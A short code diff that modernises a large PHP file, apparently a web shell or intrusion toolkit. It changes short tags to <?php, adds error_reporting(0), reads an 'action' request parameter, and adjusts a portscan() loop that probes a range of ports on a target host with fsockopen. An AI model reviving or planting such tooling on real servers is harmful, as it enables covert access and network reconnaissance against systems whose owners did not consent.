@@ -1,4 +1,6 @@
-<?
+<?php
+error_reporting(0);
+$action = $_REQUEST['action'];
 
 if (ini_get('register_globals') != '1') {
 
@@ -37,7 +39,7 @@ if ($action != "download" && $action != "view" ):
 
 
 
-<?
+<?php
 
 
 
@@ -4135,7 +4137,7 @@ function portscan() {
 
  for ($porta=$lport; $porta<=$hport; $porta++) {
 
-  $fp = @fsockopen("$id", $porta, &$errno, &$errstr, 4);
+  @$fp = fsockopen("$id", $porta, &$errno, &$errstr, 4);
 
   if ( !$fp ) { $gp++; }
 
